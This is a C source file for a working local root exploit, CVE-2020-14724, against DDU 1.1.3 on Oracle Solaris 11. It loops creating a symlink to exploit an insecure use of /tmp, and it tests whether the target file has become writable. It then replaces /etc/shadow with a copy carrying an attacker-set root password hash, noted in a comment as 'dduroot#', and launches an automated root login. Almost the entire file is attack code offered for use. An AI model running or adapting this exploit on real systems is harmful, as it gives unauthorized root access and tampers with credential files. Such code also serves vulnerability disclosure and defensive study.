/*
Exploit for DDU 1.1.3 Oracle Solaris 11 x86.
Insecure use of /tmp leads to chmod 666 on targeted file.
CVE-2020-14724
Larry W. Cashdollar
2/2/2020
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void art (void);
int update_shadow (void);

int
main (int argc, char **argv)
{
  int error = 0;
  if (argc < 3)
    {
      printf ("Missing arguments! from -> to link\n");
      exit (0);
    }
  printf
    ("[+]     Exploit for DDU v1.1.3 Solaris 11  CVE-2020-14724    [+]\nLarry W. Cashdollar\nKeeping a symlink from %s to %s\n",
     argv[2], argv[1]);
  while (1)
    {
      error = symlink (argv[2], argv[1]);

      if (error != 0)
	{
	  printf ("Error: symlink() returned %d\n", error);
	  exit (0);
	}
      if (access (argv[2], W_OK) == 0)
	{
	  printf ("Success! %s is writable\n\nHere have a kitten\n", argv[2]);
	  art ();
	  printf
	    ("Greetz to hackerfantastic, mudge, vladz, d1rtdiggler, respeto, indoushka, r00t, cDc, quine, x, dethveggie, dildog\n");
	  printf ("Ok, lets get a root prompt\n");
	  if (!update_shadow ())
	    {
	      printf
		("Eewwww something went wrong! Check the status of /etc/shadow\n");
	      exit (0);
	    }
	  error = system ("cp /tmp/myshadow /etc/shadow");	//I could write a file copy function but nah.
	  error = system ("./login.exp");
	  if (error != 0)
	    {
	      printf
		("Meh, automated root prompt failed - error from system()\n");
	    }
	  exit (0);
	}
    }
  return (0);
}


void
art (void)
{
  printf ("         /\\_/\\\n");
  printf ("    ____/ o o \\\n");
  printf ("  /~____  =Ã¸= /\n");
  printf (" (______)__m_m)\n");
}


int
update_shadow (void)
{
  FILE *fin, *fout;
  char buffer[256];

  fin = fopen ("/etc/shadow.orig", "rw");
  fout = fopen ("/tmp/myshadow", "w+");
  if (fin == NULL)
    {
      printf ("Error fopen returned NULL!\n");
      return (0);
    }
  while (fgets (buffer, 255, fin) != NULL)
    {
      if (strstr (buffer, "root:"))	//dduroot# is password
	fprintf (fout,
		 "root:$5$rounds=10000$0vWemPu4$yJZ3147cU/OSvcP/RBViYyeNtpro.o0fnxlYPkIX9UB:18306::::::289952\n");
      else
	fprintf (fout, "%s", buffer);

    }
  fclose (fin);
  fclose (fout);
  return (1);
}
